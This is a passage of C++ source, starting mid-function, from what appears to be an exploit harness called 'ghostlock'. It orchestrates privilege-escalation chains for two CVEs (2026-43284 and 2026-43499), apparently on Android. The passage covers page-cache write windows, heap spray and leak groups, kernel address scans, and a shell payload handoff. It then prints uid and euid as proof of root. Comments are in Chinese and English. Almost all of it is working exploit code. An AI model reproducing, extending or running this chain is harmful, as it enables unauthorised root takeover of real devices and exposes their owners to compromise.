            ghostlock::backend::cve_2026_43284::seam::RealSpliceIo write_io(ghostlock::backend::cve_2026_43284::seam::real_splice_io(), write_target_fd);
            ghostlock::backend::cve_2026_43284::seam::PageCacheWrite write_window(door, write_io);
            /* SA 材料由会话帧给出（夹具的 required_param=["sa"] ✓）；没有就诚实报缺 ✓。 */
            if (report->sa == nullptr) {
                if (report->refusal == nullptr) { report->refusal = "write-needs-sa"; }
                return;
            }
            if (!write_window.open_doors(*report->sa)) {
                if (report->refusal == nullptr) { report->refusal = "write-open-doors-failed"; }
                return;
            }
            ++report->calls;
            return;
        }
        if (name == "handoff") {
            ++report->handoffs;
            /* Which argument carries the payload is the surface table"s business, not a literal
             *  here: find payload_ref by name and check that one (terminal names a shell). */
            std::size_t index = 0U;
            bool found = false;
            for (const auto &spec : ghostlock::contract::kHandoffArgs) {
                if (std::strcmp(spec.key, "payload_ref") == 0) { found = true; break; }
                ++index;
            }
            if (!found || index >= view->arg_count) { return; }
            const script::ArgView &arg = view->args[index];
            bool declared = false;
            if (report->payloads != nullptr) {
                for (const std::string_view payload : *report->payloads) {
                    if (payload == arg.str) { declared = true; }
                }
            }
            if (!declared && report->refusal == nullptr) { report->refusal = "handoff-unknown-payload"; }
        }
    }

    void on_error(void *context, const char *named_code) noexcept {
        auto *report = static_cast<RunReport *>(context);
        if (report != nullptr && report->refusal == nullptr) { report->refusal = named_code; }
    }

    /** The 43284 wire carries its credentials as a required_param, not as data: without a session
     *  frame this entry refuses by name. A name it does not know is refused too (fail-closed). */
    bool check_required_params(const script::WireDoc &doc, const script::JsonNode &step,
                               RunReport &report, const char **refusal) noexcept {
        const script::JsonNode *required = doc.child(step, "required_param");
        if (required == nullptr) { return true; }
        if (required->kind != script::JsonNode::Kind::Arr) { *refusal = "step-malformed"; return false; }
        for (std::uint32_t i = 0U; i < required->count; ++i) {
            const script::JsonNode *item = doc.element(*required, i);
            std::string_view name{};
            if (item == nullptr || !doc.str_of(*item, name)) { *refusal = "step-malformed"; return false; }
            /* 43499 的载荷值：写在文档里（是**数据**，不是密钥），但必须是个能用的数。 */
            if (name == "value") {
                const script::JsonNode *value_node = doc.find("backend.cve_2026_43499.payload.value");
                std::uint64_t payload_value = 0U;
                if (value_node == nullptr || !doc.u64_of(*value_node, payload_value) || payload_value == 0U) {
                    *refusal = "route-config-missing:value";
                    return false;
                }
                report.route_value = payload_value;
                continue;
            }
            if (name == "sa") {
                /* 帧是运行时密钥：wire 只说它在哪个文件，值从不进文档。 */
                std::string_view frame_path{};
                const script::JsonNode *frame = doc.find("backend.cve_2026_43284.targets.frame");
                if (frame == nullptr || !doc.str_of(*frame, frame_path) || frame_path.empty()) {
                    *refusal = "session-frame-path-missing";
                    return false;
                }
                if (frame_path.size() + 1U > kFramePathCap) { *refusal = "session-frame-path-missing"; return false; }
                char path[kFramePathCap] = {};
                for (std::size_t i = 0U; i < frame_path.size(); ++i) { path[i] = frame_path[i]; }
                /* 三种「没有帧」要分开说：没有存储 / 打不开文件 / 文件里没有帧。 */
                if (report.sa == nullptr) { *refusal = "session-frame-storage-missing"; return false; }
                const int fd = ::open(path, O_RDONLY | O_CLOEXEC);
                if (fd < 0) { *refusal = "session-frame-unreadable"; return false; }
                const cve::SessionFrameStatus status = cve::read_session_secret_frame(fd, report.sa);
                static_cast<void>(::close(fd));
                if (status != cve::SessionFrameStatus::Ok) {
                    /* 带上状态机自己的名字：Missing（没读到东西）/ Truncated / BadLength / BadTrailer
                     *  各不同 —— 设备上分辨卡在文件还是内容就靠它。 */
                    static char frame_message[96] = {};
                    std::snprintf(frame_message, sizeof(frame_message), "session-frame-invalid:%d",
                                  static_cast<int>(status));
                    *refusal = frame_message;
                    return false;
                }
                report.sa->set = true;
            } else {
                *refusal = "required-param-unknown";
                return false;
            }
        }
        return true;
    }
}  // namespace

/** 应用调用（--ghostlock-app-call）：读一份 **profile 文档**（长度前缀 + msgpack）⇒ 跑**计划闸门** ⇒
 *  按名字报出结论。这是"把配置传入执行"的入口：文档里的 queue 键一律被闸门按名拒绝。 */
int run_app_call() noexcept {
    std::uint8_t size_bytes[4] = {};
    if (std::fread(size_bytes, 1U, sizeof(size_bytes), stdin) != sizeof(size_bytes)) {
        std::printf("plan: document-size-missing\n");
        return 2;
    }
    const std::uint32_t size = (static_cast<std::uint32_t>(size_bytes[0]) << 24U) |
                               (static_cast<std::uint32_t>(size_bytes[1]) << 16U) |
                               (static_cast<std::uint32_t>(size_bytes[2]) << 8U) |
                               static_cast<std::uint32_t>(size_bytes[3]);
    std::vector<std::uint8_t> bytes(size, 0U);
    if (size != 0U && std::fread(bytes.data(), 1U, size, stdin) != size) {
        std::printf("plan: document-truncated\n");
        return 2;
    }
    ghostlock::profile::Document doc{};
    if (doc.parse(bytes.data(), bytes.size()) != ghostlock::profile::DocumentVerdict::Ok) {
        std::printf("plan: document-unparsable\n");
        return 2;
    }
    /* 闸门输入：脚本在、内建计划不在；queue 键按文档实际内容判定（本 check 的判据在此）。 */
    const bool queue_present = doc.segment_has_key("backend.cve_2026_43499", "queue");
    const ghostlock::contract::OpSpec *spec = nullptr;
    for (std::size_t i = 0U; i < ghostlock::contract::kOpCount; ++i) {
        if (std::string_view(ghostlock::contract::kOpCatalog[i].token) == std::string_view("window.pagecache")) {
            spec = &ghostlock::contract::kOpCatalog[i];
            break;
        }
    }
    const ghostlock::pipeline::PlanOp op{spec != nullptr ? spec->token : "window.pagecache",
                              ghostlock::contract::op_token_hash("window.pagecache"),
                              ghostlock::contract::route_bit("multicast_waiter"), nullptr, 0U, false, -1};
    const ghostlock::pipeline::PlanInput input{"cve_2026_43499", &op, 1U, true, false, queue_present, true, true,
                                    true};
    const ghostlock::pipeline::GateVerdict verdict = ghostlock::pipeline::plan_gate(input);
    std::printf("plan: %s\n", ghostlock::pipeline::gate_reason_name(verdict.reason));
    return verdict.ok ? 0 : 6;
}

int main(int argc, char *argv[]) {
    /* 诊断前提：stdout 关缓冲（否则进程退出时缓冲被丢，探针行看不到 ✗ —— 真机踩过）。 */
    std::setvbuf(stdout, nullptr, _IONBF, 0);
    if (argc > 1 && argv[1] != nullptr && std::strcmp(argv[1], "--ghostlock-app-call") == 0) {
        return run_app_call();
    }
    static_cast<void>(argc);
    static_cast<void>(argv);
    const char *refusal = nullptr;
    std::vector<std::byte> frame(kFrameCap);
    std::size_t size = 0U;
    if (!script::WireDoc::read_framed(stdin, std::span<std::byte>(frame), size, &refusal)) {
        std::printf("main: wire refused (%s)", refusal);
        return 2;
    }
    script::WireDoc doc;
    if (!doc.parse(std::span<const std::byte>(frame.data(), size), &refusal)) {
        std::printf("main: wire refused (%s)", refusal);
        return 2;
    }
    std::string_view tag{};
    static_cast<void>(doc.str_of(*doc.find("schema"), tag));
    if (tag != kMapTag) {
        std::printf("main: wire refused (wire-unknown-map)");
        return 3;
    }
    const script::JsonNode *step = doc.find("step");
    if (step == nullptr || step->kind != script::JsonNode::Kind::Obj) {
        std::printf("main: wire refused (step-missing)");
        return 4;
    }
    const std::string_view step_key = text_of(doc, doc.child(*step, "key"));
    const std::string_view step_backend = text_of(doc, doc.child(*step, "backend"));
    const std::string_view step_route = text_of(doc, doc.child(*step, "route"));
    /* 报告先立：checker 与 dispatch 都通过它拿凭证与参数（不新增全局）。 */
    RunReport report{};
    /* 准备那一段的值：键从映射表查（键只写一处）。 */
    {
        struct Slot { const char *input; std::uint64_t *value; };
        const Slot slots[] = {
            {"pre_groups", &report.prepare_groups[0]},
            {"spray_groups", &report.prepare_groups[1]},
            {"post_groups", &report.prepare_groups[2]},
            {"leak_groups", &report.prepare_groups[3]},
            {"region_size", &report.prepare_region_size},
            {"object_size", &report.prepare_object_size},
            {"socket_buffer", &report.prepare_socket_buffer},
            {"send_size", &report.prepare_send_size},
            {"main_cpu", &report.prepare_main_cpu},
            {"prepare_max_attempts", &report.prepare_max_attempts},
            {"poll_rounds", &report.prepare_poll_rounds},
            {"page_size", &report.prepare_page_size},
        };
        for (const Slot &slot : slots) {
            for (std::size_t i = 0U; i < cve49::steps::kPrepareInputKeyCount; ++i) {
                const cve49::steps::PrepareInputKey &row = cve49::steps::kPrepareInputKeys[i];
                if (row.wire_key == nullptr || std::strcmp(row.input, slot.input) != 0) { continue; }
                const script::JsonNode *node = doc.find(row.wire_key);
                std::uint64_t value = 0U;
                if (node != nullptr && doc.u64_of(*node, value)) { *slot.value = value; }
            }
        }
    }

    /* 扫描窗口的两个值（schema 的 scan 组）：本树实测记录在用，不是猜的。 */
    {
        const script::JsonNode *node = doc.find("backend.cve_2026_43499.execution.scan.range_start");
        static_cast<void>(node != nullptr && doc.u64_of(*node, report.scan_start));
        node = doc.find("backend.cve_2026_43499.execution.scan.range_bytes");
        static_cast<void>(node != nullptr && doc.u64_of(*node, report.scan_bytes));
        node = doc.find("backend.cve_2026_43499.execution.scan.counter_offset");
        static_cast<void>(node != nullptr && doc.u64_of(*node, report.scan_counter_offset));
    }

    cve::SaMaterial sa{};
    cve::AccessParams params{};
    report.sa = &sa;
    report.params = &params;
    if (!check_required_params(doc, *step, report, &refusal)) {
        std::printf("main: wire refused (%s)", refusal);
        return 5;
    }
    script::ScriptBudget budget{};
    const char *budget_keys[4] = {"budgets.max_instructions", "budgets.max_bytes",
                                 "budgets.max_stack_depth", "budgets.max_script_bytes"};
    std::uint64_t budget_values[4] = {};
    for (std::size_t i = 0U; i < 4U; ++i) {
        const script::JsonNode *node = doc.find(budget_keys[i]);
        if (node == nullptr || !doc.u64_of(*node, budget_values[i])) {
            std::printf("main: wire refused (budget-unset)");
            return 6;
        }
    }
    budget.max_instructions = budget_values[0];
    budget.max_bytes = budget_values[1];
    budget.max_stack_depth = static_cast<std::uint32_t>(budget_values[2]);
    budget.max_script_bytes = static_cast<std::uint32_t>(budget_values[3]);

    std::vector<std::string> names;
    std::vector<std::uint64_t> values;
    names.reserve(kFieldCap);
    values.reserve(kFieldCap);
    for (const char *top : {"release", "device", "shizuku"}) {
        const script::JsonNode *node = doc.find(top);
        if (node != nullptr) { flatten(doc, *node, top, report, names, values); }
    }
    if (const script::JsonNode *backend = doc.find("backend")) {
        flatten(doc, *backend, "backend", report, names, values);
    }
    std::vector<script::CfgField> fields;
    fields.reserve(names.size());
    for (std::size_t i = 0U; i < names.size(); ++i) {
        fields.push_back(script::CfgField{names[i].c_str(), values[i]});
    }

    /* What the wire declares: the backends it configures, and (for the selected step's backend)
     *  the encapsulated step names the script may ask for. */
    std::vector<std::string_view> backends;
    if (const script::JsonNode *backend = doc.find("backend")) {
        if (backend->kind == script::JsonNode::Kind::Obj) {
            for (std::uint32_t i = 0U; i < backend->count; ++i) {
                const auto *edge = doc.edge_at(*backend, i);
                if (edge != nullptr) { backends.push_back(edge->key); }
            }
        }
    }
    std::vector<std::string_view> declared_steps;
    {
        const std::string prefix = "backend." + std::string(step_backend) + ".steps";
        if (const script::JsonNode *steps = doc.find(prefix)) {
            if (steps->kind == script::JsonNode::Kind::Arr) {
                for (std::uint32_t i = 0U; i < steps->count; ++i) {
                    const script::JsonNode *item = doc.element(*steps, i);
                    std::string_view name{};
                    if (item != nullptr && doc.str_of(*item, name)) { declared_steps.push_back(name); }
                }
            }
        }
        if (declared_steps.empty()) {
            std::printf("main: wire refused (steps-missing)\n");
            return 5;
        }
    }

    std::vector<std::string_view> payloads;
    if (const script::JsonNode *data = doc.find("handoff.data")) {
        if (data->kind == script::JsonNode::Kind::Arr) {
            for (std::uint32_t i = 0U; i < data->count; ++i) {
                const script::JsonNode *item = doc.element(*data, i);
                std::string_view path{};
                if (item != nullptr && doc.str_of(*item, path)) { payloads.push_back(path); }
            }
        }
    }
    report.payloads = &payloads;
    report.declared_backends = &backends;
    report.step_backend = step_backend;
    /* 参数与凭证：一步的上下文在这里备齐，dispatch 用它。 */
    report.doc = &doc;
    if (report.step_backend == "cve_2026_43284") {
        if (const char *built = build_params(doc, sa.set ? &sa : nullptr, params); built != nullptr) {
            std::printf("main: wire refused (%s)\n", built);
            return 5;
        }
    }
    report.declared_steps = &declared_steps;
    report.doc = &doc;

    script::CallSink sink{};
    sink.context = &report;
    sink.on_op = &on_op;
    sink.on_error = &on_error;
    script::Sandbox sandbox;
    if (!sandbox.open(budget, sink)) {
        std::printf("main: sandbox refused (open-refused)");
        return 7;
    }
    if (!fields.empty() && !sandbox.set_cfg_snapshot(fields.data(), fields.size())) {
        std::printf("main: sandbox refused (cfg-refused)");
        return 7;
    }
    std::vector<char> script(kScriptCap);
    const std::string_view code = text_of(doc, doc.child(*step, "code"));
    const std::size_t script_size = script::WireDoc::base64_decode(code, std::span<char>(script));
    if (script_size == 0U) {
        std::printf("main: wire refused (step-malformed)");
        return 4;
    }
    const script::ScriptRejection rejection = sandbox.run_procedure(std::string_view(script.data(), script_size));
    sandbox.close();

    const std::string_view release = text_of(doc, doc.find("release"));
    std::printf("main: tag=%s release=%.*s steps=1", kMapTag, static_cast<int>(release.size()), release.data());
    std::printf("main: step key=%.*s backend=%.*s route=%.*s", static_cast<int>(step_key.size()),
                step_key.data(), static_cast<int>(step_backend.size()), step_backend.data(),
                static_cast<int>(step_route.size()), step_route.data());
    std::printf("main: step door=%.*s", static_cast<int>(report.step_door.size()), report.step_door.data());
    if (report.step_region_bytes != 0U) {
        if (report.prepare_status != nullptr) {
            std::printf("main: prepare status=%s step=%d opened=%zu closed=%zu base=0x%llx errno=%d",
                        report.prepare_status, report.prepare_at_step, report.prepare_opened,
                        report.prepare_closed, static_cast<unsigned long long>(report.prepare_base),
                        report.prepare_error);
            std::printf("main: snitch loop saw=%u address=0x%llx\n",
                        static_cast<unsigned>(report.snitch_loop_saw),
                        static_cast<unsigned long long>(report.snitch_loop_address));
            if (report.snitch_verdict != nullptr) {
                std::printf("main: snitch verdict=%s probes=%zu rounds=%u found=0x%llx", report.snitch_verdict,
                            report.snitch_probes, report.snitch_rounds, static_cast<unsigned long long>(report.snitch_found));
            }
            std::printf("main: prepare groups open=%zu/%zu/%zu/%zu close=%zu/%zu/%zu (pre/spray/post/leak)",
                        report.prepare_open_groups[0], report.prepare_open_groups[1],
                        report.prepare_open_groups[2], report.prepare_open_groups[3],
                        report.prepare_close_groups[0], report.prepare_close_groups[1],
                        report.prepare_close_groups[2]);
        }
        if (report.discovery_verdict != nullptr) {
            std::printf("main: discovery verdict=%s probes=%zu rounds=%u found=0x%llx",
                        report.discovery_verdict, report.discovery_probes, report.discovery_rounds,
                        static_cast<unsigned long long>(report.discovery_found));
        }
        std::printf("main: prepare region=%llu bytes",
                    static_cast<unsigned long long>(report.step_region_bytes));
    }
    std::printf("main: cfg fields=%zu (skipped %zu) payloads=%zu calls=%zu handoffs=%zu steps=%zu",
                report.fields, report.skipped, payloads.size(), report.calls, report.handoffs, report.steps);
    if (report.refusal != nullptr) {
        std::printf("main: refused (%s)\n", report.refusal);
        return 9;
    }
    /* 拿到 root 的硬证据：链跑完之后看自己的凭据（只读，不做任何事）。 */
    std::printf("main: after uid=%u euid=%u gid=%u egid=%u", static_cast<unsigned>(::getuid()),
                static_cast<unsigned>(::geteuid()), static_cast<unsigned>(::getgid()),
                static_cast<unsigned>(::getegid()));
    std::printf("main: verdict %s\n", ghostlock::script::script_rejection_name(rejection));
    return rejection == script::ScriptRejection::None ? 0 : 10;
}
